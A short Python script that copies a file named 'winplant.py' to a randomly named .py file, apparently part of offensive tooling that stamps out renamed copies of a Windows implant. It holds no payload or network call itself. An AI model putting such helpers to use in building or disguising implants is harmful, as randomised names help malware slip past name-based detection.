import os.path
import shutil
import random
import string
check_cwd = os.getcwd()
ran_name = ''.join(random.choices(string.ascii_lowercase, k=6))
file_name = f'{ran_name}.py'

if os.path.exists(f'{check_cwd}//winplant.py'):
    shutil.copy('winplant.py', file_name)
else:
    print('[-] winplant.py file not found')
